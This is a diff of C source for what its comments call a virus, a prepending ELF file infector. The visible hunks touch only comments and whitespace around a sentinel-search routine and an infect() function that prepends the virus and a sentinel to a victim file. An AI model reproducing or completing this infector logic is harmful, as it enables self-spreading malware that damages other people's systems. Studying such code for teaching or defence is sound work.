@@ -26,7 +26,7 @@ static unsigned char *read_file(const char *name, size_t *size) {
     return data;
 }
 
-// Find 0xdeadbeef immediately before the ELF host
+// Find 0xdeadbeef in the given data and return the offset of the sentinel. If not found, return size.
 static size_t find_sentinel(const unsigned char *data, size_t size) {
     for (size_t i = 0; i + sizeof(SENTINEL) <= size; i++) {
         if (memcmp(data + i, SENTINEL, sizeof(SENTINEL)) == 0) {
@@ -52,7 +52,7 @@ static void write_file(const char *name, const unsigned char *data, size_t size,
     close(fd);
 }
 
-// Infect by incrementing the counter and prepend virus + sentinel to the original victim.
+// Infect by incrementing the counter and prepend virus + sentinel to the original victim
 static void infect(const char *self_name, const char *victim_name) {
     struct stat victim_status;
 
@@ -102,7 +102,7 @@ static void infect(const char *self_name, const char *victim_name) {
         counter[i] = (unsigned char)(value >> (i * 8));
     }
 
-    // Add the sentinel and then the original victim. 
+    // Add the sentinel and then the original victim.
     memcpy(infected + sentinel_offset, SENTINEL, sizeof(SENTINEL));
     memcpy(infected + sentinel_offset + sizeof(SENTINEL), victim, victim_size);
 
